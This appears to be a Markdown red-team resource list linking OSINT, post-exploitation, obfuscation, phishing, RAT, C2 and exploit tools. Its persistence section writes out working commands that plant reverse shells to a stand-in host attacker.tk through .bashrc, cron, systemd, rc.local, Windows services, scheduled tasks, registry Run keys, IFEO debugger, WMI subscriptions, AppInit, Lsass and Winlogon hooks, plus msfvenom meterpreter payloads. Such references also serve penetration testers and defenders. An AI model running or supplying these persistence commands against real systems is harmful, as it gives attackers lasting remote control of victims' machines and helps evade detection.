# OSINT

* [METAOsint (>4000)](https://metaosint.github.io/table)
* [Chiasmodon - OSINT domain analyzer](https://github.com/chiasmod0n/chiasmodon)
* [REVERSE WHOIS LOOKUP](https://github.com/devanshbatham/revwhoix)
* [OSINT TOOLS 2023 (more than 600)](https://www.advisor-bm.com/osint-tools)
* [GitLeaks (Git analayzer)](https://github.com/zricethezav/gitleaks)
* [camera exploitation tool](https://github.com/vanpersiexp/expcamera.git)
* [chaos - subdomain generator](https://github.com/projectdiscovery/chaos-client)
* [permutations](https://github.com/projectdiscovery/alterx)
* [resolver](https://github.com/projectdiscovery/dnsx)
* [Email OSINT](https://github.com/khast3x/h8mail)
* [Osint LEAK](https://leakix.net/)
* [Dorks collection](https://github.com/cipher387/Dorks-collections-list/)
* https://www.cellmapper.net/
* [Telegram OSINT](https://github.com/proseltd/Telepathy-Community)
## Shodan dorks
* https://github.com/humblelad/Shodan-Dorks
* https://github.com/AustrianEnergyCERT/ICS_IoT_Shodan_Dorks
* https://github.com/lothos612/shodan
* https://github.com/jakejarvis/awesome-shodan-queries
* https://github.com/IFLinfosec/shodan-dorks)
## Web archieves
* http://trove.nla.gov.au/search/category/websites
* https://www.webarchive.org.uk/
* https://chrome.google.com/webstore/detail/vandal/knoccgahmcfhngbjhdbcodajdioedgdo/related
* https://vefsafn.is/
* https://arquivo.pt/
* https://archive.vn/
* https://archive.md/
* https://theoldnet.com/)
* https://swap.stanford.edu/
* http://webarchive.loc.gov/
* http://wayback.archive-it.org/
* http://web.archive.bibalex.org/
* http://carbondate.cs.odu.edu/
### Documents archieves
* https://projects.icij.org/luxembourg-leaks/viz/industries/index.html
* https://worldcat.org/
* https://rootssearch.io/search
* https://vault.fbi.gov/search
* https://offshoreleaks.icij.org/
* https://annas-archive.org/search
* https://nationalarchives.gov.uk/
* https://news-navigator.labs.loc.gov/search
* http://industrydocuments.ucsf.edu/
* https://doaj.org/search/journals
## TOR
### Onion Search engines
* [Tourch](http://xmh57jrzrnw6insl.onion/)
* [QUO](http://quosl6t6c64mnn7d.onion/)
* [not Evil](http://hss3uro2hsxfogfq.onion/)
* [Haystack](http://haystakvxad7wbk5.onion/)
# OS

* [ICMP tunneling](https://telegra.ph/Kak-hakery-ispolzuyut-ICMP-tunnelirovanie-chtoby-zavladet-setyu-organizacii-08-22-2)
* CrackMapExec - helps automate assessing the security of large Active Directory networks
* [firepwd](https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py) -  decode Firefox passwords
* [pwncat is a post-exploitation platform](https://github.com/calebstewart/pwncat)
* [Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH](https://github.com/jpillora/chisel)
* [frp reverse proxy NAT bypass](https://github.com/fatedier/frp)
* [Docker Enumeration, Escalation of Privileges and Container Escapes](https://github.com/stealthcopter/deepce)
* [reverse shell generator](https://www.revshells.com)
* [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
* [Regex](https://regex101.com/)
* [reverse/back-connect SOCKS5 proxy tunnel](https://github.com/RedTeamPentesting/resocks)
* [PowerShell Obfuscation Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)
* SFX
* [multythread tor proxy](https://telegra.ph/Mnogopotochnyj-TOR-proksi-na-Python-04-21)
* [RDP MITM](https://github.com/GoSecure/pyrdp)
* [reconFTW  - automates the entire process of reconnaissance](https://github.com/six2dez/reconftw)
* [Week linux soft finder](https://github.com/belane/linux-soft-exploit-suggester)
* [Windows password ps1 logger](https://telegra.ph/Kak-poluchit-parol-administratora-na-rabochem-PK-v-domene-Active-Directory-08-05)
* [Windows persistence](https://github.com/last-byte/PersistenceSniper/)
* [Legba bruteforcer](https://github.com/evilsocket/legba)
* UAC bypass
  * [artillery](https://github.com/hackerhouse-opensource/Artillery/tree/main)
  * [stinger](https://github.com/hackerhouse-opensource/Stinger)
* [Adalanche - AD ACL Vizualizer](https://github.com/lkarlslund/Adalanche)
* Kubernetes Attack&Defence
  * [Attack](https://kubenomicon.com/)
  * [Def](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/tactics/Persistence/)
* [LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer)
* [graftcp - proxychains analog](https://github.com/hmgle/graftcp)
* [Windows updates](https://uupdump.net) and [activators](https://github.com/massgravel/Microsoft-Activation-Scripts)
* [PS full mode reverse](https://github.com/Sh3lldon/FullBypass)
* [Exe to DLL](https://github.com/hasherezade/exe_to_dll)

# PERSISTANCE

## LINUX
* [Linux Persistance MANUL](https://hadess.io/the-art-of-linux-persistence)

* Autorun

    `bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc`

* Service

    `bash#> vim /etc/systemd/system/persistence.service`<br>
    `bash$> vim ~/.config/systemd/user/persistence.service`<br>
    `[Unit]`<br>
    `Description=persistence`<br>
    `[Service]`<br>
    `ExecStart=/bin/bash ‐c 'bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1'`<br>
    `Restart=always`<br>
    `RestartSec=60`<br>
    `[Install]`<br>
    `WantedBy=default.target`<br>
    `bash#> systemctl enable persistence.service`<br>
    `bash#> systemctl start persistence.service`<br>
    `bash$> systemctl ‐‐user enable persistence.service`<br>
    `bash$> systemctl ‐‐user start persistence.service`<br>

* Tasks

    `bash#> echo "* * * * * bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1" >>/var/spool/cron/root`<br>
    `bash#> echo $'SHELL=/bin/bash\n* * * * * root bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1\n'> /etc/cron.d/pwn`<br>

* In MEMORY

    `msfvenom ‐p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888 ‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999`<br>
    `bash$> inject_linux PID meter32.bin`

* LD_PRELOAD

    `bash#> echo /path/to/meter.so >> /etc/ld.so.preload`<br>
    `bash#> echo export LD_PRELOAD=/path/to/meter.so >> /etc/profile`<br>
    `bash$> echo export LD_PRELOAD=/path/to/meter.so >> ~/.bashrc`<br>

* rc.local

    `bash#> echo "nc attacker.tk 8888 ‐e /bin/bash &" >> /etc/rc.local`

## WINDOWS

* [Windows domain persistence](https://hadess.io/pwning-the-domain-persistence/)

* Autorun

    `cmd$> copy meter.exe %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`<br>
    `cmd$> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\users\username\meter.exe"`<br>
    `cmd#> copy meter.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`<br>
    `cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\system32\meter.exe"`<br>

* Service

    `cmd#> sc create persistence binPath= "nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888" start= auto`<br>
    `cmd#> sc failure persistence reset= 0 actions=restart/60000/restart/60000/restart/60000`<br>
    `cmd#> sc start persistence`<br>

* Tasks

    `cmd#> at 13:37 \temp\nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888`<br>
    `cmd#> schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn persistence /tr "c:\temp\nc.exe ‐e c:\windows\system32\cmd.exe attacker.tk 8888"`<br>

* In MEMORY

    `msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999`<br>
    `cmd$> inject_windows.exe PID meter32.bin`<br>

* Debugger

    `cmd#> copy calc.exe _calc.exe`<br>
    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe ‐e c:\windows\system32\cmd.exeattacker.tk 8888" /f`

* Gflags

    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD/d 512`<br>
    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1`<br>
    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc ‐e \windows\system32\cmd.exe attacker.tk 8888"`

* WMI

    `cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilterCREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`<br>
    `cmd#> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"`<br>
    `cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""`<br>

* AppInit

    `cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f`<br>
    `cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f`<br>
    `cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f`<br>
    `cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter32.dll" /f`<br>

* Lsass

    `cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v"Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f`<br>

* Winlogon

    `cmd#> reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\windows\meter.exe"`<br>

* Netsh

    `cmd#> c:\windows\syswow64\netsh.exenetsh> add helper c:\windows\meter32.dll`<br>
    `cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"`

* Office

    `cmd$> reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll`

# MANUALS

* [Red Team Notes](https://dmcxblue.gitbook.io/red-team-notes-2-0/)
* [Hacktricks](https://book.hacktricks.xyz/)
* [Redteamrecipe](https://redteamrecipe.com/)
* [swisskey manul](https://swisskyrepo.github.io/InternalAllTheThings/)
* [Infosec sources](https://github.com/foorilla/allinfosecnews_sources)
* [AD attack manul](https://defcon.ru/penetration-testing/18872/)
* [GTFOBins - UNIX LPE](https://gtfobins.github.io/)
* [MS office dde](https://telegra.ph/Poleznoe-10-16-2)
* [DLL Hijacking manul](https://elliotonsecurity.com/perfect-dll-hijacking/)
* [Kerberos&AD manul](https://ardent101.github.io/)
* [Hackerone reports](https://github.com/reddelexc/hackerone-reports)
* [ACL manul](https://labs.lares.com/securing-active-directory-via-acls/)
* [Mimikatz manul](https://hadess.io/mimikatz-comprehensive-guide/)
* [Small red team manul](https://afine.com/red-team-trickery/)
* [PHP Attack MANUL](https://blog.devsecopsguides.com/attacking-php)
* [THC Cheatsheet](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)
# PostExploitation

* [Amnesiac](https://github.com/Leo4j/Amnesiac) for Win and [Bashark](https://github.com/redcode-labs/Bashark) for linux
* [Unix trace clear tool](https://github.com/mufeedvh/moonwalk)
  
# WEB
## SQLi

### Cheatsheets

* [PostSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [Swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## XSS 
### XSS Scanner Tool's :

   * XSStrike
   * BruteXSS Terminal
   * BruteXSS GUI
   * XSS Scanner Online
   * XSSer
   * xsscrapy
   * Cyclops
   * [XSS tools 2023](https://telegra.ph/xss-tools-08-06)
### Filters
   * [Filters](https://github.com/Edr4/XSS-Bypass-Filters)
## JWT Exploitation
  * Burp JWT Editor
  * Burp JSON Web Tokens
  * [JWT toolkit](https://github.com/ticarpi/jwt_tool)
  * [jwtXploiter](https://github.com/DontPanicO/jwtXploiter)


* [Flask Unsign - Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application](https://github.com/Paradoxis/Flask-Unsign)
* [phpinfo() exploitation](https://telegra.ph/Ot-stranicy-phpinfo-do-kriticheskih-uyazvimostej-i-RCE-04-17)

# Obfuscation

###Powershell
 * [Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
 * [Chimera](https://github.com/tokyoneon/Chimera)
###Python
 * [Pyarmor](https://github.com/dashingsoft/pyarmor)
 * [Hyperion](https://github.com/billythegoat356/Hyperion)
###Bash
 * [Blind-Bash](https://github.com/FajarKim/blind-bash)
 * [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
###Batch
 * [BatchObfuscator](https://github.com/guillaC/BatchObfuscator)
 * [Somalifuscator](https://github.com/KDot227/SomalifuscatorV2)
###PHP
 * [YAK Pro](https://github.com/pk-fr/yakpro-po)
###VBA
 * [VisualBasicObfuscator](https://github.com/mgeeky/VisualBasicObfuscator/tree/master)
 * [VBad](https://github.com/Pepitoh/VBad)
 * [MacroPack](https://github.com/sevagas/macro_pack)<br>
[ASP obfuscator](https://github.com/fin3ss3g0d/ASPJinjaObfuscator)
# Mobile APP
* [QARK (Quick App Review Kit)](https://spy-soft.net/dekompilyaciya-apk/)
* [appsecwiki](https://github.com/WhitePrime/appsecwiki)
* [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
* [Drozen](https://github.com/WithSecureLabs/drozer)
* [APK Studio](https://github.com/vaibhavpandeyvpz/apkstudio)
# Passwords
* [Passwords manul](https://labs.lares.com/password-analysis/)
* [Defaults&dorks](https://book.redteamguides.com/guides/tips-and-tricks)
* [Gather credentials from various password managers and windows utilities](https://github.com/Slowerzs/ThievingFox/)
* [weekpass dicts](https://weakpass.com/)
# Toolkits
* [CDK - Zero Dependency Container Penetration Toolkit](https://github.com/cdk-team/CDK)
* [Wikileaks redteam docs](https://wikileaks.org/ciav7p1/)
* https://github.com/trustedsec/ptf
* https://pastebin.com/cFMG8dy5
* https://inventory.raw.pm/tools.html#title-tools-osint
* [RAT collection](https://github.com/yuankong666/Ultimate-RAT-Collection)
* [Pentest active directory LAB](https://github.com/Orange-Cyberdefense/GOAD)
* https://github.com/enaqx/awesome-pentest
* [Phishing toolkit](https://github.com/Ignitetch/AdvPhishing)
* [Nimbo C2 framework](https://github.com/itaymigdal/Nimbo-C2)
* [Villian C2 platform](https://github.com/t3l3machus/Villain) working with [HoaxShell](https://github.com/t3l3machus/hoaxshell)
# CVE
* CVE search tools
  * [searchsploit](https://gitlab.com/kalilinux/packages/exploitdb)
  * [getsploit](https://github.com/vulnersCom/getsploit)
  * [CVEMap](https://github.com/projectdiscovery/cvemap)
  * [pompem](https://github.com/rfunix/Pompem)
  * [SiCat](https://github.com/justakazh/sicat)
* [CVE Collection](https://github.com/trickest/cve)
* [fortigate](https://github.com/horizon3ai/CVE-2022-40684)
* [FortiNAC](https://github.com/horizon3ai/CVE-2022-39952)
* [Jommla](https://github.com/ThatNotEasy/CVE-2023-23752)
